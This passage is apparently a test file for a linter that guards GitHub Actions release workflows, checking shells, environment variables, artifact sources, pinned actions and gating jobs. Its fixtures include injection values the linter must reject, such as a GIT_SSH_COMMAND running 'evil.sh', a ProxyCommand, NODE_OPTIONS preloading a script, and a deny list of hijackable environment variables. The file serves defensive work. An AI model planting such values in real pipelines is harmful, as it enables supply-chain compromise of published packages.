printf '%s\\n' "$EXPECTED_SUMS" | sed 's|  |  release/|' | sha256sum --check --strict`,
    ],
    [
      "a deploy key and a Go module tag push",
      `if [ -z "$DEPLOY_KEY" ]; then echo "::error::no key"; exit 1; fi
umask 077
mkdir -p publish-tmp/ssh
printf '%s\\n' "$DEPLOY_KEY" > publish-tmp/ssh/key
${PUSH} git@github.com:confeature/sdks.git "HEAD:refs/tags/\${RELEASE_TAG}"
rm -rf publish-tmp/ssh`,
    ],
    [
      "a mirror received from its bundle",
      `git init --quiet --bare publish-tmp/mirror.git
git --git-dir=publish-tmp/mirror.git bundle verify --quiet --end-of-options release/mirror.bundle
git --git-dir=publish-tmp/mirror.git fetch --quiet --end-of-options release/mirror.bundle refs/heads/main:refs/heads/main
git --git-dir=publish-tmp/mirror.git rev-parse refs/heads/main > publish-tmp/got-split`,
    ],
    [
      "the Go proxy warm-up",
      `curl -fsS --proto '=https' --retry 5 --retry-delay 15 --retry-all-errors "https://proxy.golang.org/\${UNIT_COORDINATES}/@v/v\${UNIT_VERSION}.info"`,
    ],
    [
      "the NuGet upload",
      'dotnet nuget push "./release/x.nupkg" --api-key "$NUGET_API_KEY" --source https://api.nuget.org/v3/index.json',
    ],
  ])("accepts %s", (_, cmd) => expect(inPublish(cmd)).toEqual([]));

  it("accepts a mirror push to the repository the settings name, and only there", () => {
    const { m, s } = withMirrors();
    const push = (repo) =>
      inPublish(
        `git --git-dir=publish-tmp/mirror.git ${PUSH.slice(4)} git@github.com:${repo}.git refs/heads/main:refs/heads/main "refs/heads/main:refs/tags/\${MIRROR_TAG}"`,
        { m, s },
      );
    expect(push("o/p")).toEqual([]);
    fires(push("o/other"), /the remote must be a literal URL/);
  });

  it("joins a backslash continuation the way bash does, so an exception still matches", () => {
    const own = swap("  publish-npm:\n", "  publish-crates:\n").replace(
      PUBLISH_STEP,
      '      - run: |\n          cargo "+${RUST_VERSION}" publish --no-verify \\\n            --manifest-path "${UNIT_PATH}/Cargo.toml"',
    );
    expect(run(own).filter((w) => CRED.test(w))).toEqual([]);
  });

  const jobWith = (extra) =>
    swap("    environment: sdk-publish-npm\n", `    environment: sdk-publish-npm\n${extra}`);
  it.each([
    [
      "a step shell other than bash",
      swap(PUBLISH_STEP, "      - shell: python {0}\n        run: echo hi"),
      /shell other than plain bash/,
    ],
    [
      "bash with extra arguments",
      swap(PUBLISH_STEP, "      - shell: bash evil {0}\n        run: echo hi"),
      /shell other than plain bash/,
    ],
    [
      "bash -i --rcfile",
      swap(PUBLISH_STEP, "      - shell: bash -i --rcfile x {0}\n        run: echo hi"),
      /shell other than plain bash/,
    ],
    [
      "a job defaults.run.shell",
      jobWith("    defaults:\n      run:\n        shell: pwsh\n"),
      /shell other than plain bash/,
    ],
    [
      "a step working-directory",
      swap(PUBLISH_STEP, "      - working-directory: apps\n        run: echo hi"),
      /working-directory/,
    ],
    [
      "a job defaults.run.working-directory",
      jobWith("    defaults:\n      run:\n        working-directory: apps\n"),
      /working-directory/,
    ],
    [
      "a Windows runner",
      GOOD.replace(
        "    runs-on: ubuntu-latest\n    environment: sdk-publish-npm",
        "    runs-on: windows-latest\n    environment: sdk-publish-npm",
      ),
      /ubuntu-\*/,
    ],
    ["a container", jobWith("    container: node:22\n"), /in a container/],
    ["services", jobWith("    services:\n      db:\n        image: postgres\n"), /beside services/],
    ["a job env: name off the allowlist", jobWith("    env:\n      PAGER: sh\n"), /sets PAGER/],
    [
      "GITHUB_ENV named anywhere",
      swap(
        PUBLISH_STEP,
        "      - env:\n          ARTIFACT: ${{ env.GITHUB_ENV }}\n        run: echo hi",
      ),
      /names GITHUB_ENV/,
    ],
    [
      "GITHUB_PATH named anywhere",
      swap(PUBLISH_STEP, "      - env:\n          ARTIFACT: GITHUB_PATH\n        run: echo hi"),
      /names GITHUB_ENV, GITHUB_PATH/,
    ],
    [
      "download-artifact into the checkout",
      swap(
        PUBLISH_STEP,
        `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: apps`,
      ),
      /release\/ or dist\/ only/,
    ],
    [
      "a checkout path",
      swap(
        PUBLISH_STEP,
        `      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false\n          path: x`,
      ),
      /takes no path/,
    ],
  ])("refuses %s", (_, jobs, re) => fires(run(jobs), re));

  it("refuses a workflow defaults.run.shell or working-directory", () => {
    fires(
      run(GOOD, { head: `${HEAD}defaults:\n  run:\n    shell: sh\n` }),
      /shell other than plain bash/,
    );
    fires(
      run(GOOD, { head: `${HEAD}defaults:\n  run:\n    working-directory: apps\n` }),
      /working-directory/,
    );
  });

  it.each([
    "DOTNET_STARTUP_HOOKS",
    "RUBYGEMS_GEMDEPS",
    "OPENSSL_CONF",
    "OPENSSL_ENGINES",
    "RUSTUP_DIST_SERVER",
    "AWS_PAGER",
    "PAGER",
    "EDITOR",
    "CARGO_REGISTRY_CREDENTIAL_PROVIDER",
    "CARGO_REGISTRIES_X_CREDENTIAL_PROVIDER",
    "CORECLR_PROFILER_PATH",
    "BASH_ENV",
    "NODE_OPTIONS",
    "PATH",
  ])("refuses %s in a step's, the job's or the workflow's env:", (name) => {
    fires(
      run(swap(PUBLISH_STEP, `      - env:\n          ${name}: x\n        run: echo hi`)),
      new RegExp(`sets ${name}`),
    );
    fires(run(jobWith(`    env:\n      ${name}: x\n`)), new RegExp(`sets ${name}`));
    fires(
      run(GOOD, { head: HEAD.replace("env:\n", `env:\n  ${name}: x\n`) }),
      new RegExp(`sets ${name}`),
    );
  });
  it.each([
    ["GIT_SSH_COMMAND that is not ssh", "GIT_SSH_COMMAND: sh evil.sh"],
    ["GIT_SSH_COMMAND with a ProxyCommand", "GIT_SSH_COMMAND: ssh -o ProxyCommand=x"],
    ["GIT_SSH_COMMAND with a config file", "GIT_SSH_COMMAND: ssh -F ssh_config"],
    ["GIT_ALLOW_PROTOCOL with ext", "GIT_ALLOW_PROTOCOL: ssh:ext"],
  ])("refuses %s", (_, kv) =>
    fires(
      run(swap(PUBLISH_STEP, `      - env:\n          ${kv}\n        run: echo hi`)),
      /GIT_SSH_COMMAND must|GIT_ALLOW_PROTOCOL allows/,
    ),
  );
});

describe("rule 8 and rule 6: local, container and reusable-workflow references (#794 review)", () => {
  it.each([
    ["a local action in a publish job", "./.github/actions/x"],
    ["a container action in a publish job", "docker://alpine:3"],
  ])("refuses %s", (_, uses) =>
    fires(run(swap(PUBLISH_STEP, `      - uses: ${uses}`)), /runs no local or container action/),
  );
  it("refuses a local action in a pack job", () =>
    fires(
      run(GOOD.replace(INSTALL_STEP, `      - uses: ./.github/actions/x\n${INSTALL_STEP}`)),
      /runs no local or container action/,
    ));
  it("allows a local action in a job that packs and holds nothing", () =>
    expect(run(`${GOOD}  lint:\n    steps:\n      - uses: ./.github/actions/x\n`)).toEqual([]));
  it("a job-level reusable workflow is held to the SHA and allow-list rules", () => {
    const call = (uses) =>
      run(GOOD, { extra: { "x.yml": parseYaml(`on: push\njobs:\n  j:\n    uses: ${uses}\n`) } });
    fires(call("evil/flows/.github/workflows/w.yml@main"), /without a full commit SHA/);
    fires(
      call(`evil/flows/.github/workflows/w.yml@${SHA}`),
      /uses evil\/flows, which .* does not allow/,
    );
  });
  it("sdk-publish.yml calls no reusable workflow at all", () =>
    fires(
      run(`${GOOD}  w:\n    uses: ./.github/workflows/cli-windows-install-verify.yml\n`, {
        extra: { "cli-windows-install-verify.yml": VERIFY_CALLEE },
      }),
      /RELEASE_CALLS does not record/,
    ));
  it("cli-release.yml calls only the recorded workflow, and passes it no secret", () => {
    fires(
      runCli(CLI.replace("cli-windows-install-verify.yml", "other.yml")),
      /RELEASE_CALLS does not record/,
    );
    fires(runCli(`${CLI}    secrets:\n      T: x\n`), /passes secrets to a called workflow/);
  });
  it("a call to a workflow that does not exist", () =>
    fires(
      run(GOOD, {
        extra: {
          "x.yml": parseYaml("on: push\njobs:\n  j:\n    uses: ./.github/workflows/gone.yml\n"),
        },
      }),
      /not a workflow of this repository/,
    ));
});

describe("§5: a credentialed job publishes this run's artifact, on a tag push only (#794 review)", () => {
  it.each(["run-id: 123", "github-token: x", "repository: other/repo"])(
    "refuses download-artifact with %s",
    (input) =>
      fires(
        run(
          swap(
            PUBLISH_STEP,
            `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          ${input}`,
          ),
        ),
        /downloads an artifact from another run/,
      ),
  );
  it("accepts download-artifact of this run", () =>
    expect(
      run(
        swap(
          PUBLISH_STEP,
          `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: release`,
        ),
      ),
    ).toEqual([]));
  const IF = "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/')\n";
  // sdk-publish.yml also runs on workflow_dispatch, a dry run that must publish nothing.
  const DISPATCH = HEAD.replace(
    '    tags: ["sdk-*-v*"]\n',
    '    tags: ["sdk-*-v*"]\n  workflow_dispatch:\n',
  );
  it("control: the tag-push condition, in a workflow a dispatch also runs, is clean", () =>
    expect(run(GOOD, { head: DISPATCH })).toEqual([]));
  it.each([
    ["no if: at all", ""],
    ["no tag condition", "    if: github.event_name == 'push'\n"],
    ["no push condition", "    if: startsWith(github.ref, 'refs/tags/')\n"],
    [
      "a negated conjunct",
      "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') && !cancelled()\n",
    ],
    ["!=", "    if: github.event_name != 'pull_request' && startsWith(github.ref, 'refs/tags/')\n"],
    [
      "the conjuncts nested in parentheses",
      "    if: always() && (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'))\n",
    ],
    [
      "the condition ORed away",
      "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') || always()\n",
    ],
  ])("refuses a publish job with %s, in a workflow a dispatch also runs", (_, cond) =>
    fires(run(swap(IF, cond), { head: DISPATCH }), /does not require a tag push/),
  );
  it("a workflow that runs on tag pushes only needs no if:", () => {
    expect(run(swap(IF, ""))).toEqual([]);
    const branches = HEAD.replace(
      '    tags: ["sdk-*-v*"]\n',
      '    tags: ["sdk-*-v*"]\n    branches: [main]\n',
    );
    fires(run(swap(IF, ""), { head: branches }), /does not require a tag push/);
  });
});

describe("13 the public gate runs on every push to main and every pull request (#794 review)", () => {
  const VERIFY = `on:
  push:
    branches: [main]
  pull_request:
jobs:
  verify:
    steps:
      - run: pnpm install --frozen-lockfile
      - run: pnpm run verify
      - run: deno task --cwd apps/cli test
`;
  const gate = (text) => publicGateFindings({ "verify.yml": parseYaml(text) }).map((f) => f.why);
  it("control: the fixture is clean, and so is the real verify.yml", () => {
    expect(gate(VERIFY)).toEqual([]);
    expect(verifyWorkflows(ROOT).filter((f) => f.file === "verify.yml")).toEqual([]);
  });
  it("a missing verify.yml", () =>
    fires(
      publicGateFindings({}).map((f) => f.why),
      /is missing/,
    ));
  it.each([
    [
      "no push trigger",
      VERIFY.replace("  push:\n    branches: [main]\n", ""),
      /every push to main/,
    ],
    ["push to another branch", VERIFY.replace("[main]", "[develop]"), /every push to main/],
    ["no pull_request trigger", VERIFY.replace("  pull_request:\n", ""), /every pull request/],
    [
      "a path filter",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    paths: [apps/**]\n"),
      /filters pull_request by paths/,
    ],
    [
      "the gate step removed",
      VERIFY.replace("      - run: pnpm run verify\n", ""),
      /no step that runs/,
    ],
    [
      "the gate stubbed",
      VERIFY.replace("pnpm run verify", "echo pnpm run verify"),
      /no step that runs/,
    ],
    [
      "an if: on the step",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - if: false\n        run: pnpm run verify",
      ),
      /no step that runs/,
    ],
    [
      "an if: on the job",
      VERIFY.replace("  verify:\n", "  verify:\n    if: false\n"),
      /no step that runs/,
    ],
    [
      "continue-on-error",
      VERIFY.replace("  verify:\n", "  verify:\n    continue-on-error: true\n"),
      /no step that runs/,
    ],
    [
      "the CLI's tests removed",
      VERIFY.replace("      - run: deno task --cwd apps/cli test\n", ""),
      /no step that runs `deno task/,
    ],
    [
      "paths-ignore",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    paths-ignore: [docs/**]\n"),
      /filters pull_request by paths-ignore/,
    ],
    [
      "push branches-ignore",
      VERIFY.replace(
        "    branches: [main]\n",
        "    branches: [main]\n    branches-ignore: [main]\n",
      ),
      /filters push by branches-ignore/,
    ],
    ["push to more branches than main", VERIFY.replace("[main]", "[main, dev]"), /exactly/],
    [
      "pull_request branches",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    branches: [main]\n"),
      /filters pull_request by branches/,
    ],
    [
      "pull_request types",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    types: [labeled]\n"),
      /filters pull_request by types/,
    ],
    [
      "a step shell",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - shell: sh\n        run: pnpm run verify",
      ),
      /shell other than bash/,
    ],
    [
      "a job defaults.run.shell",
      VERIFY.replace("  verify:\n", "  verify:\n    defaults:\n      run:\n        shell: sh\n"),
      /a job sets defaults.run/,
    ],
    [
      "a workflow defaults.run",
      `${VERIFY}defaults:\n  run:\n    working-directory: apps\n`,
      /sets defaults.run/,
    ],
    [
      "a step working-directory",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - working-directory: apps\n        run: pnpm run verify",
      ),
      /working-directory/,
    ],
    [
      "a step env",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - env:\n          NODE_OPTIONS: --require ./x.js\n        run: pnpm run verify",
      ),
      /step sets env/,
    ],
    [
      "a step continue-on-error",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - continue-on-error: true\n        run: pnpm run verify",
      ),
      /continue-on-error/,
    ],
    ["needs:", VERIFY.replace("  verify:\n", "  verify:\n    needs: other\n"), /needs:/],
  ])("refuses %s", (_, text, re) => fires(gate(text), re));
});

describe("14 every release job waits on workflow-rules (#794 review, round 3)", () => {
  const W = (jobs) => parseYaml(`on: push\njobs:\n${jobs}`);
  const GATE = "  workflow-rules:\n    steps: []\n";
  const both = (pub, cli = `${GATE}  release:\n    needs: workflow-rules\n`) =>
    releaseGateFindings({ "sdk-publish.yml": W(pub), "cli-release.yml": W(cli) }).map(
      (f) => `${f.file} ${f.job}: ${f.why}`,
    );
  it("control: the real release workflows, and a transitive chain, are clean", () => {
    expect(verifyWorkflows(ROOT).filter((f) => /does not wait|workflow-rules/.test(f.why))).toEqual(
      [],
    );
    expect(
      both(`${GATE}  setup:\n    needs: workflow-rules\n  pack-npm:\n    needs: [setup]\n`),
    ).toEqual([]);
  });
  it("a job that does not wait on it", () =>
    expect(
      both(`${GATE}  setup:\n    needs: workflow-rules\n  pack-npm:\n    steps: []\n`),
    ).toEqual(["sdk-publish.yml pack-npm: does not wait on workflow-rules"]));
  it("a release workflow without it", () =>
    expect(both("  setup:\n    steps: []\n")).toContain(
      "sdk-publish.yml -: has no workflow-rules job",
    ));
  it.each(["needs: setup", "if: false", "continue-on-error: true"])(
    "workflow-rules with %s",
    (kv) =>
      expect(
        both(`  workflow-rules:\n    ${kv}\n  setup:\n    needs: workflow-rules\n`).join(),
      ).toMatch(/so the rules can be skipped/),
  );
  it("cli-release.yml is held to it too", () =>
    expect(both(GATE, `${GATE}  release:\n    steps: []\n`)).toEqual([
      "cli-release.yml release: does not wait on workflow-rules",
    ]));
});
